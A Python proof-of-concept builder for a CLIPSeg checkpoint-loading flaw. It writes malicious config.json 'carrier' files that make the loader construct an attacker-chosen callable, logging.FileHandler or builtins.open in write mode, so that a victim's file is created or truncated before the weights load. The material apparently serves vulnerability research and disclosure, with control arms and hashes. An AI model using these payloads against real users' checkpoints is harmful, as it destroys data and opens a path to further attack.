#!/usr/bin/env python3
"""Build the CLIPSeg unsafe-reflection carrier arms (data-only model/checkpoint package).

What this builds
----------------
Four "victim workspaces". Each workspace is what a user gets when they download a
CLIPSeg checkpoint/log directory (README: "Model weights will be written in logs/")
and drop it next to the pinned source checkout:

    <root>/<arm>/logs/rd64-uni/config.json     <- the only attacker-controlled file
    <root>/<arm>/logs/rd64-uni/weights.pth     <- ordinary weights, identical across arms
    <root>/<arm>/experiments/phrasecut.yaml    <- the project's own experiment file (verbatim)
    <root>/<arm>/out/                          <- directory the artifact points at

`<root>/<arm>` is one victim workspace: that is the directory the user runs the project
from, so the artifact's target path is written relative to it. FileHandler does not create
missing parent directories, so the chosen directory has to exist on the victim machine -
the arm builder creates `out/` exactly as a victim's own log/output directory would exist.

The checkpoint id `rd64-uni` is the name that the project's own
`experiments/phrasecut.yaml` -> `individual_configurations[0].name` refers to, i.e. the
documented command `python score.py phrasecut.yaml 0 0` loads exactly this directory.

Arms
----
positive        config["model"] = logging.FileHandler, filename=<root>/out/clipseg_reflective_sink_marker, delay=false
negative        same class, same path, same mode/encoding/errors; only delay flipped to true
impact          config["model"] = builtins.open, file=<root>/out/clipseg_impact_target, mode=w
                (target pre-filled with 19 bytes, so truncation of existing data is visible)
before-weights  positive payload + a corrupt weights.pth, to show the constructor effect
                happens before the weights are read

No Python, native, shell or plugin file is added to any arm: config.json is pure JSON.

Templates are also written to `arms/<arm>/config.json` with the token `__WORKDIR__` in
place of the machine-specific work root, so the committed sample carries no personal path.
"""

import argparse
import hashlib
import json
import os
import shutil
import sys
import tempfile

CKPT_ID = 'rd64-uni'
HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_SOURCE = os.path.join(HERE, 'source', 'clipseg-77c4e2d')
ARMS_DIR = os.path.join(HERE, 'arms')

IMPACT_SEED = b'ORIGINAL-EXPERIMENT-DATA\n'   # 25 bytes of pre-existing victim data

ARMS = {
    'positive': {
        'config': {
            'model': 'logging.FileHandler',
            'filename': '__WORKDIR__/out/clipseg_reflective_sink_marker',
            'delay': False,
        },
        'weights': 'valid',
        'note': 'positive arm: the artifact-selected class constructs immediately (delay=false)',
    },
    'negative': {
        'config': {
            'model': 'logging.FileHandler',
            'filename': '__WORKDIR__/out/clipseg_reflective_sink_marker',
            'delay': True,
        },
        'weights': 'valid',
        'note': 'negative control: identical class/path/mode/encoding/errors, only delay=true',
    },
    'impact': {
        'config': {
            'model': 'builtins.open',
            'file': '__WORKDIR__/out/clipseg_impact_target',
            'mode': 'w',
        },
        'weights': 'valid',
        'note': 'impact arm: any installed callable can be selected; here builtins.open truncates a file',
    },
    'before-weights': {
        'config': {
            'model': 'logging.FileHandler',
            'filename': '__WORKDIR__/out/clipseg_reflective_sink_marker',
            'delay': False,
        },
        'weights': 'corrupt',
        'note': 'the constructor effect fires before torch.load() reads the weights file',
    },
}


def sha256(path):
    h = hashlib.sha256()
    with open(path, 'rb') as fh:
        for chunk in iter(lambda: fh.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()


def write_json(path, obj):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w', encoding='utf-8', newline='\n') as fh:
        json.dump(obj, fh, indent=2)
        fh.write('\n')


def make_valid_weights(path):
    """One ordinary state_dict, saved once and copied to every arm so the bytes match."""
    import torch
    os.makedirs(os.path.dirname(path), exist_ok=True)
    torch.save({'decoder.weight': torch.zeros(2, 2)}, path)


def main():
    ap = argparse.ArgumentParser(description='build the CLIPSeg carrier arms')
    ap.add_argument('--root', default=os.path.join(tempfile.gettempdir(), 'poc-work', 'clipseg-77c4e2d'),
                    help='work root the arms are built in (default: %%TEMP%%\\poc-work\\clipseg-77c4e2d)')
    ap.add_argument('--source', default=DEFAULT_SOURCE, help='pinned clipseg source tree')
    args = ap.parse_args()

    root = os.path.abspath(args.root)
    source = os.path.abspath(args.source)
    exp_src = os.path.join(source, 'experiments', 'phrasecut.yaml')
    if not os.path.isfile(exp_src):
        sys.exit(f'pinned source not found: {exp_src}')

    if os.path.isdir(root):
        shutil.rmtree(root)
    os.makedirs(root)

    # one weights.pth, built once, copied byte-identical into the arms that carry weights
    staging = os.path.join(root, '_staging', 'weights.pth')
    make_valid_weights(staging)
    weights_sha = sha256(staging)

    manifest = {'work_root': root, 'checkpoint_id': CKPT_ID, 'weights_sha256': weights_sha, 'arms': {}}

    for arm, spec in ARMS.items():
        arm_root = os.path.join(root, arm)
        ckpt = os.path.join(arm_root, 'logs', CKPT_ID)
        out = os.path.join(arm_root, 'out')
        os.makedirs(out, exist_ok=True)

        # 1. the carrier config.json (pure JSON, no code)
        #    __WORKDIR__ = this arm's victim workspace (the directory the user runs from)
        template = dict(spec['config'])
        resolved = {k: (v.replace('__WORKDIR__', arm_root).replace('/', os.sep) if isinstance(v, str) else v)
                    for k, v in template.items()}
        cfg_path = os.path.join(ckpt, 'config.json')
        write_json(cfg_path, resolved)
        write_json(os.path.join(ARMS_DIR, arm, 'config.json'), template)

        # 2. the weights that the loader reads *after* the constructor
        w_path = os.path.join(ckpt, 'weights.pth')
        if spec['weights'] == 'valid':
            shutil.copyfile(staging, w_path)
        else:
            with open(w_path, 'wb') as fh:
                fh.write(b'this is not a torch checkpoint\n')

        # 3. the project's own experiment file, verbatim, and the pre-filled impact target
        os.makedirs(os.path.join(arm_root, 'experiments'), exist_ok=True)
        shutil.copyfile(exp_src, os.path.join(arm_root, 'experiments', 'phrasecut.yaml'))
        if arm == 'impact':
            with open(os.path.join(out, 'clipseg_impact_target'), 'wb') as fh:
                fh.write(IMPACT_SEED)

        manifest['arms'][arm] = {
            'note': spec['note'],
            'workdir': arm_root,
            'config': resolved,
            'config_sha256': sha256(cfg_path),
            'weights_sha256': sha256(w_path),
            'weights_kind': spec['weights'],
        }

    shutil.rmtree(os.path.join(root, '_staging'), ignore_errors=True)

    with open(os.path.join(root, 'arms_manifest.json'), 'w', encoding='utf-8', newline='\n') as fh:
        json.dump(manifest, fh, indent=2)
        fh.write('\n')

    # ---- report ----
    # 路径一律相对 work root 打印:终端窗口宽 168 列,长绝对路径会把行推到窗口外,
    # 也让截图里少出现本机个人目录
    def rel(p):
        return os.path.relpath(p, root).replace(os.sep, '/')

    print(f'pinned source : {rel(source) if source.startswith(root) else source}')
    print(f'work root     : {root}')
    print(f'checkpoint id : {CKPT_ID}  (experiments/phrasecut.yaml -> individual_configurations[0].name)')
    print(f'weights.pth   : sha256 {weights_sha}')
    print()
    for arm in ARMS:
        info = manifest['arms'][arm]
        print(f'[{arm}] {info["note"]}')
        print(f'  {rel(os.path.join(info["workdir"], "logs", CKPT_ID, "config.json"))}')
        for line in json.dumps(info['config'], indent=2).splitlines():
            print(f'    {line.replace(root, "<work-root>")}')
        print(f'  config.json sha256 : {info["config_sha256"]}')
        print(f'  weights.pth sha256 : {info["weights_sha256"]} ({info["weights_kind"]})')
        print()

    pos = manifest['arms']['positive']['config']
    neg = manifest['arms']['negative']['config']
    diff = {k: (pos.get(k), neg.get(k)) for k in set(pos) | set(neg) if pos.get(k) != neg.get(k)}
    print('single-field difference between positive and negative (the only manipulated leaf):')
    for k, (a, b) in sorted(diff.items()):
        print(f'  {k}: {a!r}  ->  {b!r}')
    print()
    print('arms_manifest.json written next to the work root.')


if __name__ == '__main__':
    main()
